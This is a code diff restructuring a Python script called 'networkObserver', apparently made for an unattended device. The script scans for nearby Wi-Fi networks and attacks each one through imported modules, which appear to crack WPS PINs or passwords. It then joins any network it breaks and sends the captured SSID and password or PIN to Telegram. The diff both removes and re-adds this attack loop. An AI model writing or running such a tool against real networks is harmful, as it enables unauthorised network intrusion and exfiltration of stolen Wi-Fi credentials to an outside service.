@@ -16,6 +16,19 @@ from wifi_attack import attack_target
 from wifi_connect import connect_to_wifi
 from send_to_telegram import send_message
 
+# --- Constants ---
+CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")
+
+
+# --- Utility functions ---
+def load_config():
+    try:
+        with open(CONFIG_PATH) as f:
+            return json.load(f)
+    except Exception as e:
+        print(f"[!] Failed to load config.json: {e}. Defaulting to stop_on_success=True")
+        return {}
+
 def has_internet():
     try:
         subprocess.check_call(
@@ -27,75 +40,6 @@ def has_internet():
     except subprocess.CalledProcessError:
         return False
 
-# Set working directory to /core
-os.chdir(os.path.dirname(os.path.abspath(__file__)))
-
-# Load config
-config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
-try:
-    with open(config_path) as f:
-        config = json.load(f)
-    stop_on_success = config.get("stop_on_success", True)
-except Exception as e:
-    stop_on_success = True
-    print(f"[!] Failed to load config.json: {e}. Defaulting to stop_on_success=True")
-
-# Ensure logs directory exists
-os.makedirs(os.path.dirname(DEBUG_LOG), exist_ok=True)
-
-# Configure logging
-logging.basicConfig(
-    filename=DEBUG_LOG,
-    level=logging.DEBUG,
-    format="%(asctime)s [%(levelname)s] %(message)s"
-)
-
-# Also log to console
-console = logging.StreamHandler()
-console.setLevel(logging.INFO)
-console.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
-logging.getLogger().addHandler(console)
-
-# Clear log file
-open(DEBUG_LOG, "w").close()
-logging.info("Starting networkObserver")
-
-# Clean temp files
-clean_files(TARGETS_FILE, CRACKED_FILE, REAVER_OUTPUT)
-logging.info("Temporary files cleaned.")
-
-# Scan for targets
-targets = scan_targets(ATTACK_INTERFACE)
-
-# Attack loop
-while targets:
-    essid, power = targets.pop(0)
-    logging.info(f"Attacking {essid} (power: {power} dB)")
-    result = attack_target(ATTACK_INTERFACE, essid)
-    if result:
-        connected = connect_to_wifi(essid, pin=result.get("pin"), psk=result.get("psk"))
-        if connected:
-            msg = f"[+] Target compromised:\nSSID: {essid}"
-            if result.get("psk"):
-                msg += f"\nPassword: {result['psk']}"
-            elif result.get("pin"):
-                msg += f"\nWPS PIN: {result['pin']}"
-            if has_internet():
-                logging.info("Connection successful. Sending to Telegram...")
-                send_message(msg)
-            else:
-                logging.warning("Connected, but no internet. Skipping Telegram message.")
-            if stop_on_success:
-                logging.info("Stopping after first successful compromise (as per config).")
-                break
-        else:
-            logging.warning(f"Connection to {essid} failed after PIN/PSK.")
-    else:
-        logging.warning(f"No credentials obtained for {essid}.")
-
-logging.info("Process completed.")
-
-# Shutdown logic
 def is_ssh_active():
     try:
         output = subprocess.check_output(["ps", "-eo", "pid,ppid,user,args"]).decode()
@@ -106,6 +50,64 @@ def is_ssh_active():
     except Exception:
         return False
 
+# --- Init ---
+os.chdir(os.path.dirname(os.path.abspath(__file__)))
+config = load_config()
+stop_on_success = config.get("stop_on_success", True)
+
+os.makedirs(os.path.dirname(DEBUG_LOG), exist_ok=True)
+
+logging.basicConfig(
+    filename=DEBUG_LOG,
+    level=logging.DEBUG,
+    format="%(asctime)s [%(levelname)s] %(message)s"
+)
+console = logging.StreamHandler()
+console.setLevel(logging.INFO)
+console.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
+logging.getLogger().addHandler(console)
+
+open(DEBUG_LOG, "w").close()
+logging.info("Starting networkObserver")
+
+# --- Cleanup ---
+clean_files(TARGETS_FILE, CRACKED_FILE, REAVER_OUTPUT)
+logging.info("Temporary files cleaned.")
+
+# --- Main logic ---
+targets = scan_targets(ATTACK_INTERFACE)
+
+while targets:
+    essid, power = targets.pop(0)
+    logging.info(f"Attacking {essid} (power: {power} dB)")
+    result = attack_target(ATTACK_INTERFACE, essid)
+
+    if result:
+        connected = connect_to_wifi(essid, pin=result.get("pin"), psk=result.get("psk"))
+        if connected:
+            msg = f"[+] Target compromised:\nSSID: {essid}"
+            if result.get("psk"):
+                msg += f"\nPassword: {result['psk']}"
+            elif result.get("pin"):
+                msg += f"\nWPS PIN: {result['pin']}"
+
+            if has_internet():
+                logging.info("Connection successful. Sending to Telegram...")
+                send_message(msg)
+            else:
+                logging.warning("Connected, but no internet. Skipping Telegram message.")
+
+            if stop_on_success:
+                logging.info("Stopping after first successful compromise (as per config).")
+                break
+        else:
+            logging.warning(f"Connection to {essid} failed after PIN/PSK.")
+    else:
+        logging.warning(f"No credentials obtained for {essid}.")
+
+logging.info("Process completed.")
+
+# --- Shutdown ---
 if is_ssh_active():
     logging.info("SSH session detected. Skipping shutdown.")
 else:
